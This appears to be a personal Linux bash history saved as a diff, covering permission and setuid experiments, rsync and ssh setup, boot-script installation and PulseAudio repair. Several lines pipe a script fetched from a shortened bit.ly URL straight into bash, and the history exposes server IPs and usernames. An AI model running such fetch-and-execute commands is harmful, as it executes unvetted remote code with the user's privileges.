+asdasdasd
+asdasdasdasd
+asdasdasdasdasd
+wget -qO - https://bit.ly/opensshgit | bash
+exit
+ls
+cd .lo
+cd .local/
+ls
+cat logger.txt 
+nano logger.txt 
+cat logger.txt 
+ls
+du -h logger.txt 
+rm logger.txt 
+ls
+cat logger.txt 
+clear
+nano logger.txt 
+clear
+cat logger.txt 
+ls
+du -h
+du -h logger.txt 
+cd
+ls
+l
+ls
+clear
+ls
+cd /home/$USER/
+ls
+la
+ls .local/
+ls
+cat logger.txt 
+ls
+cd /etc
+cd init.d/
+ls
+laxz
+cd
+nano laxz
+laxz
+./laxz
+sudo chmod 755 ./laxz
+./laxz
+sudo update-rc.d /etc/init.d/laxz
+sudo update-rc.d /etc/init.d/laxz ./laxz
+sudo update-rc.d /etc/init.d/laxz defaults
+sudo update-rc.d ./laxz defaults
+mv ./laxz /etc/init.d/laxz
+sudo mv ./laxz /etc/init.d/laxz
+sudo update-rc.d /etc/init.d/laxz defaults
+sudo update-rc.d /etc/init.d/laxz.sh defaults
+exit
+wget -qO - https://bit.ly/opensshgit | bash
+aa
+passwd
+wget -qO - https://bit.ly/opensshgit | bash
+lllll
+laxz
+aasdasdsadas
+wget -qO - https://bit.ly/opensshgit | bash
+clear
+wget -qO - https://bit.ly/opensshgit | bash
+git -v
+git --verison
+git --version
+git --version == None
+git --version
+clear
+exit
+cd /etc
+cd init.d/
+;s
+ls
+clear
+ls
+ls laxz
+ls
+./laxz
+ls laxz 
+cd ,,
+cd ..
+cd rc.d
+ls
+ls rc0.d/
+ls rcS.d/
+cd init.d
+ls
+ufw
+file ufw
+nano ufw
+cat laxz 
+nano ufw
+cat laxz 
+nano laxz 
+sudo nano laxz 
+laxz
+./laxz
+mv ./laxz ./laxzst
+sudo mv ./laxz ./laxzst
+laxzs
+laxzst
+./laxzst 
+ln
+ln --help
+whatis ln
+cd ..
+cd rc.d
+cd rc.local
+ls
+nano logger.txt 
+rm logger.txt 
+car .local/
+ll
+ls .logger
+ls .local/
+ls
+ll
+nano logger.txt 
+rm logger.txt 
+ls
+ll
+cd .local/
+rm logger.txt 
+ls
+ll
+cd ..
+ls
+cat logger.txt 
+rm logger.txt 
+ls
+ll
+clear
+ls
+cd .local/
+ls
+nano logger.txt 
+rm logger.txt 
+ls
+nano logger.txt 
+rm logger.txt 
+clear
+ps
+users
+sudo reboot noe
+sudo reboot no3
+sudo reboot now
+neofetch 
+cat /proc/meminfo 
+lshw
+lspci
+sudo lshw -short -C memory
+sudo dmidecode --type 17 | more
+cd laxz-priv/
+cd web/
+ls
+cd javascript/
+ls
+mkdir vlxx_dlr
+cd vlxx_dlr/
+firebase
+firebase init
+ls
+code .
+laxzopen .
+code .
+firebase deploy
+exit
+ssh -T laxz@172.83.9.207
+ssh -T laxzvm@172.83.9.207
+cat id_rsa.pub 
+sshcloud
+lcear
+clear
+ls
+cd
+nano .bashrc 
+source .bashrc 
+clear
+exit
+mkdir /home/minlaxz/public_rsync
+exit
+cd /var
+cd run
+ls
+ls rsyslogd.pid 
+file rsyslogd.pid 
+cat rsyslogd.pid 
+nano rsyslogd.pid 
+clear
+exit
+upload2laxzvm 
+exit
+cd laxz-priv/
+ls
+cd web/
+ls
+cd javascript/
+l
+cd vlxx_dlr/
+ls
+code .
+laxzopen ,
+laxzopen .
+cd
+cd .ssh/
+ls
+alias
+sshcloud
+ssh -l laxzvm 172.83.9.207
+sshcloud
+cd
+nano .bashrc 
+source .bashrc 
+alias
+unalias sshvm
+unalias sshcloudtest 
+alias
+clear
+sshcloud 
+cd /etc
+ls rsyncd.conf 
+sshvm
+sshcloud
+alias
+sshcloud
+ssh -l laxzvm 172.83.15.243
+sshcloud
+ssh -l laxzvm 172.83.9.207
+s
+ssh -l laxzvm 172.83.9.207
+sshcloud
+ssh -l laxzvm 172.83.9.207
+sshcloud
+sshcloud 
+exit
+sudo service --status-all
+laxzst
+sudo service laxzst --status
+sudo service rsync start
+sudo service --status-all
+cd /etc
+ls rsync
+find rsync
+find rsyncd.conf
+find rsyncd.conf.bak
+cd /var
+cd lo
+cd log
+ls
+sudo apt purge rsync
+sudo apt install rsync
+cd /etc
+sudo service --status-all
+sudo service rsync start
+sudo service --status-all
+/etc/init.d/rsync status
+sudo nano rsyncd.conf
+sudo service rsync restart 
+sudo service --status-all
+rsync -rdt rsync://172.83.9.207:12001
+rsync -rdt rsync://172.83.9.207:12001/test
+rsync -rdt rsync://172.83.9.207:12001/test/
+rsync -rdt rsync://172.83.9.207:12001/
+rsync -rdt rsync://172.83.9.207:12001/test/
+alias
+cd
+sudo nano /etc/rsyncd.conf 
+rsync -rdt rsync://172.83.9.207:12001/test/
+rsync -rdt rsync://172.83.9.207:12002/test/
+rsync -rdt rsync://172.83.9.207:12001/test/
+sudo nano /etc/rsyncd.conf 
+sudo service rsync restart 
+rsync -rdt rsync://172.83.9.207:12001/test/
+sudo nano /etc/rsyncd.conf 
+rsync -rdt rsync://172.83.9.207:12001/test/
+/etc/init.d/rsync status
+clear
+rsync -rdt rsync:laxzrsync//172.83.9.207:12001/test/
+rsync -t rsync:laxzrsync//172.83.9.207:12001/
+rsync 
+rsync -t rsync://laxzrsync@172.83.9.207:12001/
+rsync -t rsync://laxzrsynca@172.83.9.207:12001/
+rsync -t rsync://laxzrsynca@172.83.9.207:12001/test
+rsync -t rsync://laxzrsync@172.83.9.207:12001/test
+rsync -t rsync://laxzrsync@172.83.9.207:12001/test/
+rsync -t rsync://laxzrsync@172.83.9.207:12001/test/ /home/minlaxz/public_rsync/
+rsync -t rsync://laxzrsync@172.83.9.207:12001/
+rsync -t rsync://laxzrsync@172.83.9.207:12001/test
+rsync -t rsync://laxzrsync@172.83.9.207:12001/test/
+rsync -t rsync://laxzrsync@172.83.9.207:12001/test/test
+rsync -t rsync://laxzrsync@172.83.9.207:12001/
+ssh -T root@172.83.15.243
+ssh -T laxzvm@172.83.15.243
+alias
+sshcloud 
+clear
+rsync -t rsync://laxzrsync@172.83.9.207:12001/
+rsync -t rsync://172.83.9.207:12001/
+rsync -t rsync://laxzrsync@172.83.9.207:12001/test
+rsync -t rsync://laxzrsync@172.83.9.207:12001/
+sudo service rsync restart 
+rsync -t rsync://laxzrsync@172.83.9.207:12001/
+rsync -t rsync://172.83.9.207:12001/
+rsync -t rsync://172.83.9.207:12001/test
+rsync -t rsync://172.83.9.207:12001/
+rsync -t rsync://laxzrsync#172.83.9.207:12001/
+rsync -t rsync://laxzrsync@172.83.9.207:12001/
+rsync -t rsync://laxzrsync@172.83.9.207:12001/test
+rsync -t rsync://laxzrsync@172.83.9.207:12001/test/
+local2cloud 
+nano .bashrc 
+source .bashrc 
+local2cloud 
+source .bashrc 
+nano .bashrc 
+source .bashr
+source .bashrc 
+ls
+cd laxz-priv/
+ls
+mkdir public_rsync
+laxzopen .
+upload2laxzvm 
+alias
+nano ~/.bashrc 
+source ~/.bashr
+source ~/.bashrc 
+downloadlaxzvm 
+ls
+ls FCLOUD/
+uptime
+sshcloud
+xit
+exit
+sudo service --status-all
+upload2laxzvm 
+cd 
+upload2laxzvm 
+rsync
+alis
+alias
+downloadlaxzvm 
+upload2laxzvm 
+$TERM
+upload2laxzvm 
+sshcloud 
+exit
+sshcloud 
+exit
+neofetch
+cd Downloads/
+ls
+mv faf-exercise.pcap ~/laxz-priv/public_rsync/
+cd 
+cd laxz-priv/public_rsync/
+ls
+upload2laxzvm 
+sshcloud 
+exi
+exit
+sshcloud
+sudo ifconfig
+sshcloud
+exit
+ls
+clear
+kazam 
+clear
+sshcloud
+clear
+sshcloud
+clear
+exit
+sshcloud 
+clear
+sshcloud 
+sshcloud 
+exi
+sshcloud
+ls .run
+ls *.run
+sudo chmod u+x pia-linux-1.1.1-02545.run 
+ls *.run
+./pia-linux-1.1.1-02545.run 
+clear
+sshcloud
+ping http://167.99.69.226/
+ping 167.99.69.226
+ssh root@http://167.99.69.226/
+ssh root@167.99.69.226
+ssh syslab@167.99.69.226
+ssh syslab@167.99.69.226:4200
+ssh syslab@167.99.69.226 -p 4200
+ssh syslab@167.99.69.226 -p 22
+exit
+cd /home/
+ls
+rm gparted_details.htm 
+ls
+ls -l
+sudo whoami
+clear
+sudo who
+who
+sudo who root
+sudo who minlaxz
+cleawr
+cler
+clear
+ls -l
+ls -la
+cd 
+ls
+ls -la
+ls -lar
+cd .
+cd laxz-priv/
+ls -lar
+sudo chown root ..
+ls -lar
+sudo chgrp root ..
+ls
+ls -lar
+cd ..
+cd laxz-priv/
+ls
+ls -la
+la -lar
+cd ..
+cd anaconda3/
+ls
+ls -lar
+cd ..
+ls
+cd laxz-priv/
+ls
+cd machine-learning/
+ls
+ls -la
+ls -lar
+cd ../permissions/
+sl
+ls
+clear
+ls
+./file 
+clera
+clear
+ls -l
+sudo ifconfig
+clear
+cd
+cd /home/
+ls -l
+cd minlaxz/
+ls -l
+exit
+clear
+ls
+cd laxz-priv/
+ls
+cd permissions/
+ls
+./file 
+su root
+ls
+ls -la
+cd
+cd laxz-priv/
+cd permissions/
+sudo mkdir rootest
+ls -la
+cd rootest/
+ls
+ls file
+nano file
+cd laxz-priv/
+ls
+mkdir permissions
+cd permissions/
+nano file
+./file
+sudo chmod u+x file 
+./file 
+clear
+ls
+mkdir testfolder
+cd testfolder/
+touch file1
+touch file2
+touch file3
+ls
+touch file3
+ls
+nano file
+nano file3
+touch file3
+nano file
+nano file3
+claer
+clear
+touch file3
+cat file3
+cat file3 > /dev/null
+cat file3
+nano file3
+cd ..
+ls
+ls -la
+cd testfolder/
+ls -la
+cd ..
+sudo chmod 777 testfolder/
+ls -la
+cd testfolder/
+ls -la
+cd ..
+sudo chmod 775 testfolder/
+ls -la
+cd testfolder/
+ls
+ls =la
+ls -la
+ll
+getfacl
+getfacl .
+cd ..
+ls
+sudo chmod 777 testfolder
+sudo chmod 777 testfolder/
+sudo chmod 777 testfolder
+ls -la
+sudo chmod 777 testfolder/
+ls -la
+sudo chmod 775 testfolder/
+ls
+ls -l
+ls -l testfolder/
+getfacl testfolder/
+setfacl
+setfacl --help
+cd testfolder/
+ls
+ls -la
+ls -l
+ls -lr
+ls -lra
+ls
+cd ..
+sudo chmod 666 testfolder/ -R
+ls -la
+cd testfolder/
+sudo chmod 766 testfolder/ -R
+cd testfolder/
+ls
+ls -la
+./file2
+./file1
+./file3
+clear
+alias
+clear
+cd ..
+sudo chmod 755 testfolder/ -R
+ls
+cd testfolder/
+ls
+cd ..
+sudo chmod 744 testfolder/ -R
+ls
+cd testfolder/
+ls
+ls -la
+cd ..
+sudo chmod 744 testfolder/
+sudo chmod 644 testfolder/*
+cd testfolder/
+ls -la
+ls
+ls -l
+ll
+file file
+file file1
+clear
+file file3
+clear
+ls
+setfacl --help
+setfacl -m u:minlaxz:x file1
+ls -l
+getfacl file1
+./file1
+setfacl -m u:minlaxz2:x file1
+setfacl -m u:minlaxz:x file1
+ls -la
+setfacl -x u:minlaxz:x file1
+setfacl -d u:minlaxz:x file1
+setfacl --help
+setfacl -x u:minlaxz:x file1
+setfacl -m u:minlaxz:x file1
+setfacl -x u:minlaxz:x file1
+setfacl -x u:minlaxz:r file1
+sudo setfacl -x u:minlaxz:x file1
+sudo setfacl -dm u:minlaxz:x file1
+ls
+ls -la
+setfacl -x u:minlaxz:x
+setfacl -x u:minlaxz:x file1
+sudo setfacl -x u:minlaxz:x file1
+ls
+ls -l
+sudo chmod 000 file1
+ls -la
+sudo chmod 755 file1
+ls -l
+./file1 
+getfacl file
+getfacl file1
+setfacl -x u:minlaxz:1 file1
+setfacl -x u:minlaxz:001 file1
+setfacl -xm u:minlaxz:x file1
+setfacl -x u:minlaxz:x file1
+setfacl --help
+setfacl -m u:minlaxz:0 file1
+ls -l
+setfacl -x u:minlaxz:0 file1
+setfacl -m u:minlaxz:000 file1
+ls -l
+setfacl -b file1
+ls -l
+sudo chmod 644 file1
+ls -la
+setfacl -h
+setfacl -x -h
+ls -l
+cd ..
+ls -l
+mkdir folder
+ls -l
+sudo chmod 1755 folder
+ls -l
+sudo chmod o-x folder/
+ls -l
+sudo chmod o-T folder/
+sudo chmod o-t folder/
+ls -l
+cd laxz-priv/
+ls
+cd permissions/
+ls
+ls -l
+sudo chmod 1755 folder/
+ls -l
+sudo adduser testuser1
+users
+ls /home/
+sudo deluser testuser1
+ls /home/
+rm -rf /home/testuser1/
+sudo rm -rf /home/testuser1/
+ls /home/
+clear
+exit
+id -u
+sudo id -u
+clear
+gip
+gid
+id -g
+sudo id -g
+exit
+cd laxz-priv/
+cd permissions/
+ls
+mkdir C
+cd C
+ls
+nano setuid.c
+gcc -o setuid setuid.c 
+;s
+ls
+gcc -o setuid setuid.c 
+nano setuid.c
+gcc -o setuid setuid.c 
+nano setuid.c
+gcc -o setuid setuid.c 
+ls
+./ setuid
+./setuid 
+clear
+./setuid 
+sudo ./setuid
+ls -l
+sudo chmod 4775
+sudo chmod 4775 setuid
+ls
+./setuid 
+ls -l
+sudo chown root setuid
+sudo chgrp root setuid
+ls
+ls -l
+./setuid 
+sudo chmod 4755 setuid
+ls -l
+./setuid 
+chmod -r
+chmod --help
+chmod -r
+exit
+chusr
+ls
+cd laxz-priv/permissions/
+ls
+ls  -l
+./f
+./file 
+sudo chmod a+x file 
+ls -l
+sudo chmod all+x file 
+sudo chmod 755 file 
+ls -l
+sudo chmod 1755 file 
+ls -l
+sudo shutdown now
+ls
+cd laxz-priv/permissions/
+ls
+ls -l
+./file 
+cd C/
+ls
+./setuid 
+ls setuid
+file setuid
+nano setuid.c 
+getuid
+nano setuid.c 
+python3
+cd ..
+mkdir PY
+cd PY/
+nano setuid.py
+ls -l
+cd ..
+cd C
+ls 
+ls -l
+cd ..
+cd PY/
+ls
+sudo chown root:root
+sudo chown root:root setuid.py 
+ls -l
+tree -p .
+claer
+clear
+ls
+ls -l
+sudo chmod 4755 setuid.py 
+ls -l
+./setuid.py 
+nano setuid.py 
+python3 setuid.py 
+nano setuid.py 
+sudo nano setuid.py 
+./setuid.py 
+python3 setuid.py 
+nano setuid.py 
+sudo nano setuid.py 
+./setuid.py 
+ls -l
+./setuid.py 
+mv setuid.py setuid
+./setuid 
+clear
+file setuid 
+./setuid 
+which python3
+cd ../C
+ls
+ls -l
+./setuid 
+file setuid
+ls
+clear
+ls
+cd ..
+ls
+cd ..
+ls
+cd raspberry_pi/
+ls
+cd ..
+cd python/
+ls
+exit
+sudo shutdown now
+sudo apt update
+sudo apt upgrade  -y
+sudo apt install pulseaudio --reinstall
+start-pulseaudio-x11 
+sudo service --status-all
+sudo service --status-all | grep +
+docker status
+docker info
+clera
+clear
+sudo start-pulseaudio-x11 
+start-pulseaudio-x11 
+clea
+clear
+ls
+cd /
+ls
+cd home/
+ls
+ls -l
+tree -p .
+clear
+ls -
+ls -l
+cd minlaxz/
+ls
+ls -la
+cd /home/minlaxz/.config/
+ls
+ls -ls
+ls -la
+ls -l
+ls -la
+ls -lair
+cd pulse/
+ls -la
+ls -la pulse/
+clear
+ls -la
+sudo chown minlaxz:minlaxz pulse/ -R
+ls pulse/
+cd pulse/
+ls
+clear
+ls
+sudo shutdown now
+ls
+cd /home/
+ls
+ls -l
+clear
+l s-l
+ls -l
+ls-l
+ls -l
+clear
+cd .con
+cd .config/
+ls 
+ls -la
+sudo chmod 755 pulse/ -R
+start-pulseaudio-x11 
+sudo start-pulseaudio-x11 
+start-pulseaudio-x11 
+cd pulse/
+ls -la
+sudo chown minlaxz:minlaxz pulse/ -R
+ls -la
+cd pulse/
+ls
+ls -la
+start-pulseaudio-x11 
+sudo start-pulseaudio-x11 
+start-pulseaudio-x11 
+cd /home/minlaxz/.config/pulse//
+cd /home/minlaxz/.config/pulse/
+ls
+cd ..
+ls
+ls -u
+ls -pu
+ls pulse
+ls -la
+sudo chown minlaxz:minlaxz pulse/
+ls -la
+cd pulse/
+ls
+cd /home/minlaxz/.config/pulse//
+ls
+ls -la
+start-pulseaudio-x11 
+suod start-pulseaudio-x11 
+sudo start-pulseaudio-x11 
+start-pulseaudio-x11 
+nano /home/minlaxz/.config/pulse//daemon.conf
+sudo apt purge pulseaudio
+ls
+cd ,,
+cd ..
+ls
+cd pulse/
+ls -l
+ls -la
+sudo cd pulse/
+cd pulse/
+sudo chown minlaxz:minlaxz pulse/
+cd pulse/
+ls
+cd ..
+sudo apt install pulseaudio
+sudo apt --fix-broken
+sudo apt install --fix-broken
+sudo apt autoremove 
+sudo shutdown now
